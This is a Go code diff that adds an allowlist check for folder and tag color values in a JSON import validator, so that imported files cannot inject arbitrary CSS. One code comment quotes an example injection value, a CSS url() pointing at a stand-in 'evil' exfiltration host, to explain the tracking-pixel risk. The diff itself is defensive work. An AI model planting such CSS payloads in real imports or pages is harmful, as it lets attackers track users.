@@ -7,6 +7,8 @@ import (
 	"net/url"
 	"strings"
 	"time"
+
+	"foldex/internal/pkg/cssvalid"
 )
 
 // maxImportClickCount bounds the per-link click_count an import may request.
@@ -64,6 +66,13 @@ func (f JSONFile) Validate() error {
 		if len(name) > 200 {
 			return fmt.Errorf("folders[%d]: name too long (max 200)", i)
 		}
+		// Empty color is allowed (the apply layer defaults it); a non-empty
+		// value MUST pass the cssvalid allowlist, otherwise an untrusted
+		// JSON file could plant `red url("https://evil/exfil")` and turn
+		// every folder chip render into a tracking pixel (CLAUDE.md §4).
+		if fl.Color != "" && !cssvalid.IsValidColor(fl.Color) {
+			return fmt.Errorf("folders[%d]: color must be a hex (#abc, #aabbcc) or linear-gradient(135deg, #hex, #hex)", i)
+		}
 	}
 	for i, t := range f.Tags {
 		name := strings.TrimSpace(t.Name)
@@ -72,6 +81,10 @@ func (f JSONFile) Validate() error {
 		}
 		if len(name) > 80 {
 			return fmt.Errorf("tags[%d]: name too long (max 80)", i)
+		}
+		// Same tracking-pixel defense as folders above.
+		if t.Color != "" && !cssvalid.IsValidColor(t.Color) {
+			return fmt.Errorf("tags[%d]: color must be a hex (#abc, #aabbcc) or linear-gradient(135deg, #hex, #hex)", i)
 		}
 	}
 	for i, l := range f.Links {
